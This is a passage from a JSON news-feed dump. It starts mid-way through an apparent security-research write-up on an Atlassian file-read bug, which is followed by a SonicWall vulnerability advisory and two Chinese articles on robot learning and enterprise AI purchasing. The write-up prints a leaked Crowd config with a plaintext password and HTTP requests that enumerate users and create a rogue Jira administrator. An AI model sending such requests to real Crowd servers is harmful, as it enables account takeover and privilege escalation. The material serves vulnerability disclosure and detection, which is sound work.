sensitive content in the\nWEB-INF\ndirectory.\nOur plan was simple:\nSmash through the Atlassian documentation.\nLook for references to configuration files stored within the\nWEB-INF\ndirectory.\nOne of the first hits we got was the\nJira documentation\n, which describes its integration with Atlassian Crowd.\nWhat Is Atlassian Crowd?\nAtlassian Crowd is Atlassian's centralized identity and single sign-on (SSO) product, essentially the user directory and authentication hub that sits behind the rest of the Atlassian stack.\nInstead of each Jira, Confluence, Bitbucket, and Bamboo instance managing its own separate list of users and passwords, Crowd holds that information in one place, and the other applications ask Crowd to handle authentication and group membership for them.\nLong story short: Atlassian Crowd is an identity management solution, which Atlassian recommends using with your Atlassian products deployment.\nAtlassian Crowd and Jira Deployment\nWe started reading the Atlassian Crowd and Jira deployment\nconfiguration\ninstructions and quickly stumbled upon this fragment:\nThis looks really fine. This fragment tells us that:\nThe Crowd config file is located at\nWEB-INF/classes/crowd.properties\n.\nIt stores\napplication.name\nand\napplication.password\n.\nNaturally, as it’s 2026, we asked our AI agent to deploy Crowd within our Jira installation, in compliance with the official documentation.\nWhen that was done, we manually verified the content of the\ncrowd.properties\nfile:\n$ cat WEB-INF/classes/crowd.properties\napplication.name jira\napplication.password Jira-Crowd-App-Pass-2026!\napplication.login.url <http://localhost:8095/crowd/console/>\ncrowd.server.url <http://localhost:8095/crowd/services/>\ncrowd.base.url <http://localhost:8095/crowd/>\nsession.isauthenticated session.isauthenticated\nsession.tokenkey session.tokenkey\nsession.validationinterval 2\nsession.lastvalidation session.lastvalidation\nThis allowed us to confirm that the config file stores the following information:\nThe application name.\nThe password for the application, in plaintext.\nThe Crowd URL.\nWith those leaked, we can try to access Crowd directly and see what we can achieve.\nAuthors' note: Crowd configuration allows you to specify a whitelist of IP addresses that can access it. Such a configuration may make this attack scenario much harder, as you would need to pivot through arbitrary machines or use SSRF-like capabilities of Jira, Confluence, or Bitbucket to reach Crowd directly. It is probably safe to assume that in real environments you will find both very permissive and locked-down Atlassian Crowd installations.\nAccessing Atlassian Crowd: Impact\nWhen you access Atlassian Crowd directly with the leaked credentials, it is basically game over. Sounds logical: you are accessing the identity management solution as an administrator of the application.\nYou can use the direct access to:\nCreate new users.\nModify user privileges.\nAnd much more.\nFor instance, you can try this by sending the following request:\nGET /crowd/rest/usermanagement/1/search?entity-type=user&max-results=1000 HTTP/1.1\nHost: jira.lab.local:8095\nAuthorization: Basic eW91cjpjcmVkZW50aWFscw==\nIn the response, you will receive the list of existing users.\nYou can of course do something much more malicious, like creating a new user:\nPOST /crowd/rest/usermanagement/1/user HTTP/1.1\nHost: jira.lab.local:8095\nContent-Type: application/json\nContent-Length: 194\nAuthorization: Basic eW91cjpjcmVkZW50aWFscw==\n{\n\"name\": \"watchTowrPoC\",\n\"active\": true,\n\"first-name\": \"Evil\",\n\"last-name\": \"Admin\",\n\"display-name\": \"watchTowrPoC\",\n\"email\": \"watchTowrPoC@attacker.test\",\n\"password\": {\"value\": \"1PocPa$$wd23\"}\n}\nAnd then add this user to the\njira-administrators\ngroup:\nPOST /crowd/rest/usermanagement/1/group/user/direct?groupname=jira-administrators HTTP/1.1\nHost: jira.lab.local:8095\nAccept: application/json\nContent-Type: application/json\nContent-Length: 24\nAuthorization: Basic eW91cjpjcmVkZW50aWFscw==\n{\"name\": \"watchTowrPoC\"}\nYou can be proud of yourself, pal. You just got promoted to Jira Administrator.\nFile Read to Jira Administrator Through Crowd: Full PoC\nWe would not be ourselves if we did not implement the entire chain in a single Python PoC, just to make it look nice.\nDetection Artefact Generator\nAs always, we have created a Detection Artefact Generator, which you can use to check whether an instance is vulnerable. It can be found\nhere\n, working for the following Atlassian products:\nJira.\nConfluence.\nBitbucket.\nA sample run against a vulnerable instance looks like this:\nSpeak soon.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/",
+      "content_chars": 16325,
+      "content_sha256": "f011df472600a363765a73b2259cc647783cad13e8c7c31411092f6469f7be85",
+      "content_fetched_at": "2026-10-07T00:34:38.212206+00:00",
+      "author": "watchtowr-labs",
+      "author_name": "watchTowr Labs",
+      "author_url": "https://labs.watchtowr.com/",
+      "published_at": "2026-10-06T17:01:36+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:watchtowr-labs",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://labs.watchtowr.com/",
+        "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "watchtowr-labs",
+          "url": "https://labs.watchtowr.com/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "watchtowr-labs",
+          "name": "watchTowr Labs",
+          "home_url": "https://labs.watchtowr.com/"
+        },
+        "article": {
+          "title": "You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)",
+          "url": "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/",
+          "content_sha256": "f011df472600a363765a73b2259cc647783cad13e8c7c31411092f6469f7be85"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:96a11b4350eb1c7a",
+      "who": "sonicwall-advisory",
+      "who_url": "https://psirt.global.sonicwall.com/",
+      "action": "publish",
+      "target": "SonicWall SMA1000 Series Appliances Affected By Multiple Vulnerabilities",
+      "target_url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017",
+      "text": "sonicwall-advisory published: SonicWall SMA1000 Series Appliances Affected By Multiple Vulnerabilities",
+      "at": "2026-10-06T09:44:00+00:00",
+      "external_id": "a:96a11b4350eb1c7a",
+      "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017",
+      "title": "SonicWall SMA1000 Series Appliances Affected By Multiple Vulnerabilities",
+      "content": "<p>\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">1) CVE-2026-102255 - Pre-authentication SSRF via unintended forward-proxy </span></p><p>A Pre-authentication SSRF vulnerability exists in the SMA1000 Appliance Work Place interface due to an unintended alternate access path. By abusing this path, a remote unauthenticated attacker could potentially exploit this vulnerability to direct the appliance to issue requests on their behalf and reach internal functionality and perform unauthorized operations.<br></p><p>CVSS Score: 10.0<br>\nCVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>\nCWE-918: Server-Side Request Forgery (SSRF)<br>\nCWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n</p><p>\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">2) CVE-2026-102256 - Post-authentication Remote Code Execution (RCE) Vulnerability</span></p><p>Post-authentication Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability has been identified in the SMA1000 appliance which in specific conditions could potentially enable a remote authenticated attacker as administrator to execute arbitrary OS commands, resulting in remote code execution.\n<br></p><p>CVSS Score: 7.8<br>\nCVSS Vector: CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H<br>\nCWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">3) CVE-2026-102257 - Post-authentication Zip Slip Vulnerability </span></p><p>A Zip Slip vulnerability in the in the SMA1000 Appliance Management Console (AMC) interface allows an attacker to extract files outside the intended destination directory using a specially crafted archive, resulting in remote code execution.<br></p><p>CVSS Score: 7.2<br>\nCVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H<br>\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n</p><p>\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">4) CVE-2026-102258 - Post-authentication Stored Cross-Site Scripting (XSS) Vulnerability</span></p><p>Post-authentication Stored Cross-Site Scripting (XSS) vulnerability has been identified in the SMA1000 Appliance Management Console (AMC) which in specific conditions could potentially enable a remote authenticated attacker as administrator to store and potentially execute arbitrary JavaScript code in the Appliance Management Console (AMC).\n<br></p><p>CVSS Score: 5.5<br>\nCVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N<br>\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n</p><p></p><p>\n</p>\n<p>SonicWall strongly advises users of the SMA1000 series appliances to upgrade to the mentioned fixed release version to address these vulnerabilities.<br> <br>There is currently no evidence any of the vulnerabilities addressed in this release are being exploited in the wild. Please note that SSL-VPN running on SonicWall Firewall products are not affected by this vulnerability.</p>\nCVE: CVE-2026-102255, CVE-2026-102256, CVE-2026-102257, CVE-2026-102258\nLast updated: Oct. 6, 2026, 9:44 a.m.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017",
+      "content_chars": 3201,
+      "content_sha256": "d9eac916ddba7b45a609a3ddc8cf5a79ff31fe79d1e8235740179ccf88ab5d47",
+      "content_fetched_at": "2026-10-07T00:34:37.930618+00:00",
+      "author": "sonicwall-advisory",
+      "author_name": "SonicWall Security Advisories",
+      "author_url": "https://psirt.global.sonicwall.com/",
+      "published_at": "2026-10-06T09:44:00+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:sonicwall-advisory",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://psirt.global.sonicwall.com/",
+        "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017"
+      ],
+      "refs": {
+        "actor": {
+          "login": "sonicwall-advisory",
+          "url": "https://psirt.global.sonicwall.com/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "sonicwall-advisory",
+          "name": "SonicWall Security Advisories",
+          "home_url": "https://psirt.global.sonicwall.com/"
+        },
+        "article": {
+          "title": "SonicWall SMA1000 Series Appliances Affected By Multiple Vulnerabilities",
+          "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017",
+          "content_sha256": "d9eac916ddba7b45a609a3ddc8cf5a79ff31fe79d1e8235740179ccf88ab5d47"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:944fbfe049ce5051",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "玻璃杯从深度图里消失之后：机器学习拆任务的取舍",
+      "target_url": "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html",
+      "text": "yage-share published: 玻璃杯从深度图里消失之后：机器学习拆任务的取舍",
+      "at": "2026-10-06T00:00:00+00:00",
+      "external_id": "a:944fbfe049ce5051",
+      "url": "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html",
+      "title": "玻璃杯从深度图里消失之后：机器学习拆任务的取舍",
+      "content": "模型架构\n科研与技术前沿\nAI 编程\n把大任务拆成几个小任务、每个环节专门做自己那块再拼起来，还是把整个任务交给一个模型从头训到尾、中间不留死环节，是机器学习里争论多年的分歧。前者的优势是每个环节能单独调试、单独换人；后者的优势是优化的自由度。透明玻璃杯挂不上挂钩、测距图里看不到杯子，后面的机器人实验就是给这两边各打了一个分。文章先看两边各得多少分，再讲为什么拆分会输、输在哪，什么时候拆分依然是对的，最后给出判断环节去留的三条判据，帮你在自己的系统里决定一个环节该留还是该拆。\n玻璃杯挂不上挂钩，因为测距相机先把杯子看丢了\n一台七自由度的机械臂站在工作台前。夹爪把一只透明玻璃杯从台面上拎起来，慢慢往挂钩上方送。杯子到了挂钩前面，机械臂偏离了位置，杯把和挂钩错开，杯子挂空了，这轮任务失败。\n机械臂想把杯子挂稳，往往需要一个专门测量物体远近的传感器，也就是常说的\nRGB-D\n相机。这类相机大多靠红外光工作：朝物体投射特定图案，再看图案反射回来的形变，算出图像里每个像素离镜头的距离。\n但玻璃天生透明。投射的红外光穿过杯体，在弯曲的边缘折射散开，传感器收不到能对上号的反射光。算出的距离图里，玻璃杯所在的位置没有读数，本该有杯子的地方一片空白。\n前端传感器把关键数据弄丢之后，后方的动作策略网络只能对着残缺的输入硬猜，机械爪的末端定位自然产生偏差。用这类相机看玻璃，典型的问题总是反复出现：看不准杯壁在哪里、套不进把手、找不到半空中的杯子。这是光学测距原理决定的，\n独立计量实测\n也把边界量了出来：平板玻璃影响不大，折射体积加暗背景才让读数大片失效。英特尔\nRealSense\n社区的技术支持\n指出，凡在可见光波段透明的材质，在基于立体的测距算法里也必然透明，真想测量只能人工喷涂显影粉末。微软在处理\nAzure\nKinect\n的同类故障反馈\n时，同样把半透明物体的深度塌陷判定为设计使然，一切符合预期（By\nDesign: Everything is working as expected）。\n玻璃杯在彩色镜头里轮廓完整，在深度图里整块消失。\n这种前后两段的设计，问题出在传感器这道中间步骤上：它要先把镜头收到的连续光线转成一张定死的距离网格。透明物体让测距丢了读数，传给动作网络的就只剩残缺数据，下游也没机会把动作失败的教训反馈回去修正前端读数。\n同一台机械臂，只换输入，成功率差了近四倍\n算距离的硬件遇到玻璃就失效，干脆把这一步整个删掉，让神经网络直接看两只镜头拍到的原始画面，它自己能不能摸出远近？西北大学和斯坦福大学的一组人在真实机械臂上做了受控对照（\n论文\n，\n项目主页\n）。他们搭了个实验台架，主角同样是一台七自由度的机械臂，在工作台边缘和机械臂手腕上分别装了相机。每台相机其实由两颗相距六点三厘米的标准光学镜头组成，两只眼睛同时从略微不同的角度拍照。这两颗镜头出厂时本来就能自己算出一张距离图，但这组实验故意不用它算好的距离，而是把左右两只眼睛拍到的原始彩色画面直接送给策略网络。\n为了做对照，他们也保留了传统做法：把传感器测出的距离反算成空间里的三维坐标点，也就是常说的点云。评测任务一共设计了五种：把香蕉装进盒子、把吐司精准插进烤箱的卡槽，以及把塑料杯、不锈钢杯和玻璃杯分别挂到杯架上。每个任务先由真人操作示范两百条轨迹，用来训练扩散策略网络。正式评测时，物体的摆放位置每次都会随机变换，每个任务都在真机上实打实地运行二十次（20\ntrials）。\n在机械臂硬件相同、示教数据相同、模型参数规模也相当的前提下，仅仅改变喂给模型的数据形式，就能带来近乎四倍的成功率差异。各组成绩：把左右两张画面送入网络、并在两个视角间做注意力融合的一组拿到59%；同样给这两张画面，但只是在通道上直接拼接、不让两重视角做交互，成功率落到45%；如果只给单镜头拍的一张普通彩色照片，成功率是43%；如果在单张彩色照片旁边附带一张硬件算出的距离图，成绩反而掉到41%；表现最差的是把测出来的三维空间点塞进专门处理点云的网络，成功率只剩14%。\n这篇论文目前还在学术会议审稿阶段（\n投稿页\n），代码库也没有正式公开，社区也没有第三方的独立复现结果。云端算力服务商Lambda列在作者机构中，作者在线程里向其表达了算力赞助的感谢（\n作者在线程里致谢\n），该公司的技术博客也发布了相关介绍（\nLambda\n博客\n）。每种方法在五个任务上各测二十次，合计一百次真机尝试，样本不算大；按二项分布估算置信区间，范围并不算窄，这组数据给的是明确的走向，不是精确的数值。\n拆开还是贯通\n机械臂在现实里做动作，传统工程思路默认前端要先算出远近。整个系统拆成两个模块：前端管测距、在三维空间里重建坐标，后端拿坐标推动作，接口处把数据拼上。流程里那些不参与反向传播的固定步骤或硬件计算，会把梯度在接口处截断。前端测距出了偏差，后端的策略网络只能接收失真数据，前端也听不到动作失败的反馈。\n每种输入在真机上各测二十次、共五个任务，合计一百次。其中，左右视角注意力融合方案取得了59%的成功率。通道直接拼接方案降至45%，输入单张彩色照片为43%，单张彩色照片附加硬件距离图降至41%，而输入空间点云的方案只有14%。点云方案垫底的原因在于真实环境测得的距离读数本身就存在空洞和噪点，转换成空间坐标后还需要进行裁切、降采样和坐标对齐等手工预处理。论文的作者指出，这套预处理稍有不慎，整个策略的成功率会直接归零。\n45% 和 59%\n的差距体现了信息组织方式的差异。通道拼接与跨视角注意力方案有相似的模型参数，接收了相同的原始画面。在\n45% 的方案中，两个镜头提取的特征在进入决策层之前没有任何交互；59%\n的网络在没有人工深度标注的情况下，通过动作损失的反向传播，在左右画面的对应像素之间实现了自动几何关联。\n五种输入方式的成绩从 59 到 14\n依次排开，双目融合最高。\n后续的消融与探测实验印证了这种表征的形成过程。把右侧画面换成左侧画面的复制图，机械臂的成绩立刻大幅下滑。研究人员使用线性探针解析模型训练后的内部特征，可以稳定提取机械爪与目标物体的相对空间距离，而训练前的网络权重无法读取该信息。在未人工指定三维坐标格式的前提下，神经网络通过端到端动作优化自行建立了适合操作的空间表征。\n双目端到端策略的优势并不代表显式几何计算没有意义。输入数据足够干净的场景里，先算三维坐标依然有工程竞争力。在针对操作任务的\nOBSBench基准\n评测中，简单的点云策略经常优于纯图像或图像叠加深度图的配置。英伟达关于\n点云鲁棒性的对比研究\n也显示，面对光照变化或视角晃动，基于空间坐标的模型展现出更强的抗干扰表现。在仿真环境中提供无噪声的理想距离时，依赖空间坐标的控制策略在多数任务中能达到九成以上的成功率。在灵巧手抓取实验\nDextrAH-RGB\n中，双目端到端策略与基于深度的分段策略整体打平；在具体装箱测试中，十一个物体里三个由深度方案胜出，其余测试打平。\n直接使用双目输入在实践中存在限制。双目相机需要精确的时间同步和标定，镜头的物理基线导致夹爪靠近物体时出现无视差盲区。面对透明材质左右视图的特征匹配可能不准。在二十次挂玻璃杯测试中，注意力融合的双目模型仅成功三次。\n贯通训练和拆成几段，不必站队。某个组件要不要单独拎出来，要看它在真实数据上出错的概率，以及后面的组件能不能利用冗余信息自己纠偏。环境干净、传感器稳的时候，把相关组件拆开调试和替换都更简单；遇到反光、折射等真实干扰，专门管测距的环节反复失准，打通梯度让整个网络一起学，往往比拆分更划算。\n拆分何时胜出\n早年在一家做工业物联网系统的公司，有个项目按传统思路拆成几个子模型分别建模，估摸要数月；改用单个模型从头训到尾，两天拿到可用原型。拆出来的子模块在现场工业数据面前本来就不稳，端到端训练直接拿最终目标驱动特征提取，脆弱的人工接口不要了。这与机器人实验互为补充：前端环节若在现场数据中稳定性存疑，贯通训练可展现效率优势；前端环节若能持续输出高保真特征，模块化拆分则利于工程迭代。\n检查系统架构时，几个具体问题能帮上忙。这个模块在生产环境里出错的频率做过测试吗？它输出残缺或失真的中间结果时，下一个模块有没有别的信号能把信息补上？前后模块在工程上接得起来吗？模块本身稳定、下游有自己纠偏的余地，或者工程条件不支持端到端联合训练，独立模块就留着；前端故障率高、下游又吸收不了偏差，就该考虑把梯度接通。\n每条管线都在付出同样的拆分代价\n同样的取舍也发生在机器人之外。检索增强系统把长文档切成固定长度的片段、再用相似度阈值拦截，检索和推理在这里隔断：下游模型再强，也补不回前置召回时漏掉的关键细节。智能体系统在规划与执行之间插进写死规则的状态机，真实环境的反馈就到不了规划模型。早年的自然语言处理与计算机视觉放弃人工特征、改由深层网络自己学出表示，也是同一个道理。\n机械臂在玻璃杯挂钩前落空的现象，流程里安插的每个不参与训练的环节，都在压缩全局优化能探索的空间。决定拆出一个专门环节之前，先实测它在真实场景里的失效率，再算下游能不能自己消化这些误差。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html",
+      "content_chars": 3745,
+      "content_sha256": "28b295cb42751a87fe0b67857f88272d7c6b70a903431162527ff5b55ffdb9c8",
+      "content_fetched_at": "2026-10-07T00:33:24.088843+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-10-06T00:00:00+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "玻璃杯从深度图里消失之后：机器学习拆任务的取舍",
+          "url": "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html",
+          "content_sha256": "28b295cb42751a87fe0b67857f88272d7c6b70a903431162527ff5b55ffdb9c8"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:6a83ac9535be9e6e",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "在大模型上 build：三家大公司替你踩过的坑",
+      "target_url": "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html",
+      "text": "yage-share published: 在大模型上 build：三家大公司替你踩过的坑",
+      "at": "2026-10-06T00:00:00+00:00",
+      "external_id": "a:6a83ac9535be9e6e",
+      "url": "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html",
+      "title": "在大模型上 build：三家大公司替你踩过的坑",
+      "content": "产业与竞争\nAI 产品与平台\n他们花的钱最多，建的却不是模型\n开利是一家历史悠久的美国工业公司，专注于暖通空调领域已经有 110\n年的历史。它拥有约 50,000 名员工。今年 9\n月，在一个行业基础设施会议的圆桌（\n视频\n）上，三家大公司坐到一起，这家公司的首席数据与\nAI 官 Arun Nandi 报了个数：2026 年 1 月至 7 月期间，全公司的 token\n账单增至原来的 8\n倍。这些支出主要用于服务自家产品的边缘设施、软件和数据团队。Arun\n强调账单涨成这样出自刻意安排，那是探索的账单（that is the bill for\ndiscovery… for innovation.）。\n开利买的是模型本身，训练基座这件事，三家谁都没做。稍大一些的是合众银行，全美第五大，70,000\n名员工。有人问首席 AI 官 Prashant Mehrotra\n会不会预训练自己的基座模型，他说不会说死，但今天没有（never say never.\nIt’s not there today.）。110,000\n名员工的商业地产服务机构仲量联行（JLL），其基座模型也完全外包。\n这并不是这三家公司的怪癖。\nMenlo\nVentures\n在 2025 年 11 月做了一个调查，采访了 495\n位美国企业的决策者。数据显示，2024 年企业 AI 项目中有 47%\n是自己搭建，但现在已经变成了 76% 直接采购。在企业大模型 API\n的使用量中，Anthropic、OpenAI 和 Google 占据了\n88%。这批人把底层模型当作日常消耗品，工程力气花在模型之上的那一层。仔细梳理他们在实践中趟出来的路子，主要有四条可以直接对照着抄的作业。\n占位：自建与采购的分界线不在用不用\nAPI，而在模型层作为消耗品采购、工程资产沉淀在模型之上的路由与计费系统\n第一个作业：把换模型当必然事件来设计\n传统企业软件采购，评估时默认一套系统能用上三到五年。可现在头部 AI\n实验室两到四周就推一个新模型，合众银行的采购思路随之调整。Prashant\nMehrotra 说，现在用一个东西的前提是知道能在 12 到 18\n个月窗口期里换掉它（we can have it replaced in a 12 to 18 month\nwindow.）\n这种替换不是纸上谈兵，合众银行内部已经有多个业务项目在半途换掉了整个模型家族。Mehrotra\n认为，基础设施就应该像道路、供水、电力一样天然存在，企业只管在上面盖房子，模型只是新接的水电。开利的\nArun Nandi\n也提醒了另一个更糟的现实风险：新模型可能因为完全不在你控制之内的原因下架，有时甚至不在你这个国家的控制之内。Nandi\n的原文只一句：can be pulled for reasons completely out of your\ncontrol。既然外部供应随时可能发生变动，随时可替换就成了实实在在的风险对冲。写提示词和评测集，就按着下季度要换一家的假设来设计。\n第二个作业：先装计费系统，再谈采用\n当模型变成日常消耗品，企业内部紧接着要面对的就是内部账单如何分摊。合众银行的做法是把\ntoken 成本记到每个员工名下，让他们自己弄清楚该买哪种模型（everybody is\npaying for the token internally… so they know which ones to\nbuy）。光有账单还不够，他们还同步在内部做技能培训，教大家什么任务该配什么规格的模型。Mehrotra\n提醒过，给客户或员工回答一个简单问题，用不着万亿 token 的大模型。\n仲量联行是最明显展示这种思路落地的公司。这家 11\n万员工的公司，技术人员只占约 3,000 人。CTO Yao Morin\n的策略是先给员工很大的 token\n配额，再砍下去。员工一开始不少人抱怨配额少了没法干活，后来自己摸索出了很多省钱的技巧，比如不用一遍遍重传同样的数据。Morin\n的结论是，给约束会让人的创造力冒出来（Human ingenuity is amazing when\nyou give them constraints.）。开利的 Nandi\n对成本的看法也类似：成本不该按 token\n单价算，而该按每个任务带来的业务价值算。所以从一开始就要按任务归因，不要把成本账做糊涂。\n第三个作业：用户手感优先于评测分数\n选模型时，最顺手的依据是各种公开评测的排行榜。但在开利，Arun Nandi\n发现过去八个月到一年中，某些岗位的员工对特定模型家族形成了忠诚度，这和公开评测的结果对不太上，也和\ntoken 价格没有关系（slightly different from what we’ve seen from evals…\ndevoid of all of the cost per\ntoken.）。评测替代不了用户在实际使用中的感受。\n开利的策略是，给不同岗位分流：多步推理用尖端模型，例行问题走便宜的主力模型，开源权重就行。合众银行对同一语音通道给客户的和给员工的延迟、成本都分开；仲量联行则直接做成统一网关，Yao\nMorin\n的关键设计是把响应时限作为独立变量：有些后台任务不需要实时响应，可以拖到算力便宜的时段跑，成本再降一截。Morin\n提醒过，很多前沿厂商没有给企业的 SLA\n承诺，找他们要五个九的可用性，他们会当场笑出来。在真正承流量的路由层，调度决策的依据，正是这些沉淀下来的用户手感。\n第四个作业：把失败率写进预算\n企业在 AI 上大量投入，同时也会经历很多失败。Arun Nandi\n说，他管理这些创新项目的心态更像管基金：组合里两三个高绩效项目，抵得过\n95 个不成功的，少数赢家 offset 掉全部输家。\nGartner\n在 2026 年 1 月的更新指出，截至 2025 年底，至少有 50% 的 GenAI\n项目已在概念验证后终止，无法进入生产。\n451\nResearch（属于标普全球）\n对 1,006\n位欧美企业从业者调查，发现企业明确放弃多数 AI 倡议的比例从 17% 升至\n42%。面对如此高的失败率，开利不去写大段立项文档，而是直接收原型代码做快速分诊。中小团队可以照抄，预设清晰的中止条件，数据不达预期果断砍。\n这家公司的话，要打个折再听\n上面这些做法的出处，也需要交代清楚。这个圆桌讨论是在第三方会议机构\nKisaco Research 举办的\nAI Infra Summit\n上进行的，时间是 2026 年 9 月 16 日。Lambda\n作为算力供应商是会议的白金赞助商，圆桌的主持人是它的首席商业官。目前公开的视频是\n41 分钟的版本，由 Lambda 频道在 9 月 25\n日剪辑发布，现场的原版全场录像则看不到。\nLambda 作为算力供应商，80% 的收入来自大云厂商和头部实验室（\n他本人在访谈里的说法\n），这一点也是需要注意的。它的\n官方博客\n把自建画成硬件地狱，把只买\nAPI\n的路线说成给供应商绑架，推荐的出路全是自家的预留算力。连词也有故事，Mehrotra\n在台上首先说出了 valuemaxxing（先找准价值点，再决定钱花在哪），Lambda\n官方帖随后宣称这个词诞生于自家圆桌。但在\nIBM\n的科技专栏\n里可以发现，早在圆桌三个月前就已经白纸黑字记载过这个词的发明人是\nLambda 的直接竞争对手 Nebius 的首席营收官 Marc Boroditsky。\n抛开商业动机，只看三位高管在各自公司里做的事，他们的做法站得住脚。台上的说法，多数在公开材料里能找到证据（8\n倍账单这类自报数字除外）。比如 Mehrotra 在\n另一次访谈\n里明确说过，银行的天平已经倒向租用模型。开利的\nCTO Markus Klausner 在接受\nFortune\n采访时也证实了，公司的模型策略是所有都要，走前沿商业 API\n加微调开源。仲量联行的模型与公有云架构，在\n官方新闻稿\n和\nMicrosoft\n的客户案例\n里都有说明。真正可以放心照抄的，就是前面这四条工程作业。需要打折看待的，只是\nLambda 替它们包装的概念和结论。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html",
+      "content_chars": 3385,
+      "content_sha256": "f57a6c1e885c260f6e08517b57eb2b8a0da1079e02a8c50379d354e743aa4b6a",
+      "content_fetched_at": "2026-10-07T00:33:24.415465+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-10-06T00:00:00+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
